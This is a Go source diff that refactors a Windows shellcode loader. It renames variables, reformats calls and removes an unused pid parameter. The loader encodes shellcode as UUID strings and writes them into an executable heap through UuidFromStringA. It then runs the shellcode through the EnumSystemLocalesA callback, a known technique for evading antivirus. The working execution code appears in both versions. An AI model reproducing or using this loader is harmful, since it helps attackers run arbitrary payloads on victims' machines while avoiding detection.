@@ -11,7 +11,7 @@ import (
   "github.com/google/uuid"
 )
 
-func UuidFromString(shellcode []byte, pid int) (error) {
+func UuidFromString(shellcode []byte) (error) {
   uuids, err := shellcodeToUUID(shellcode)
   if err != nil {
     return err
@@ -19,18 +19,27 @@ func UuidFromString(shellcode []byte, pid int) (error) {
 
   kernel32 := windows.NewLazySystemDLL("kernel32")
   rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
-  heapCreate := kernel32.NewProc("HeapCreate")
-  heapAlloc := kernel32.NewProc("HeapAlloc")
-  enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
-  uuidFromString := rpcrt4.NewProc("UuidFromStringA")
 
-  heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
-  if heapAddr == 0 {
+  HeapCreate := kernel32.NewProc("HeapCreate")
+  HeapAlloc := kernel32.NewProc("HeapAlloc")
+  EnumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
+  UuidFromString := rpcrt4.NewProc("UuidFromStringA")
+
+  heapAddr, _, err := HeapCreate.Call(
+    0x00040000,
+    0,
+    0,
+  )
+  if (heapAddr == 0) {
     return err
   }
 
-  addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
-  if addr == 0 {
+  addr, _, err := HeapAlloc.Call(
+    heapAddr,
+    0,
+    0x00100000,
+  )
+  if (addr == 0) {
     return err
   }
 
@@ -38,7 +47,10 @@ func UuidFromString(shellcode []byte, pid int) (error) {
   for _, uuid := range uuids {
     u := append([]byte(uuid), 0)
 
-    rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
+    rpcStatus, _, err := UuidFromString.Call(
+      uintptr(unsafe.Pointer(&u[0])),
+      addrPtr,
+    )
     if rpcStatus != 0 {
       return err
     }
@@ -46,7 +58,10 @@ func UuidFromString(shellcode []byte, pid int) (error) {
     addrPtr += 16
 	}
 
-  ret, _, err := enumSystemLocalesA.Call(addr, 0)
+  ret, _, err := EnumSystemLocalesA.Call(
+    addr,
+    0,
+  )
   if ret == 0 {
     return err
   }
